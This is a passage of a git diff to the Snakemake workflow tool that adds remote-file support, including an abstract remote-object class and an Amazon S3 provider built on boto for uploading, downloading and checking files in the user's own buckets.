a/snakemake/exceptions.py b/snakemake/exceptions.py\nindex d606c99..7440442 100644\n--- a/snakemake/exceptions.py\n+++ b/snakemake/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a/snakemake/executors.py b/snakemake/executors.py\nindex 6bd0114..961e7ba 100644\n--- a/snakemake/executors.py\n+++ b/snakemake/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a/snakemake/io.py b/snakemake/io.py\nindex 0ba9cbd..3e32628 100644\n--- a/snakemake/io.py\n+++ b/snakemake/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \"./\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a/snakemake/jobs.py b/snakemake/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a/snakemake/jobs.py\n+++ b/snakemake/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a/snakemake/remote_providers/RemoteObjectProvider.py b/snakemake/remote_providers/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- /dev/null\n+++ b/snakemake/remote_providers/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a/snakemake/remote_providers/S3.py b/snakemake/remote_providers/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- /dev/null\n+++ b/snakemake/remote_providers/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^/]*)/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket/key': %s\" %\n+                                  self.file())\ndiff --git a/snakemake/remote_providers/__init__.py b/snakemake/remote_providers/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- /dev/null\n+++ b/snakemake/remote_providers/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a/snakemake/remote_providers/implementations/S3.py b/snakemake/remote_providers/implementations/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- /dev/null\n+++ b/snakemake/remote_providers/implementations/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize / float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = 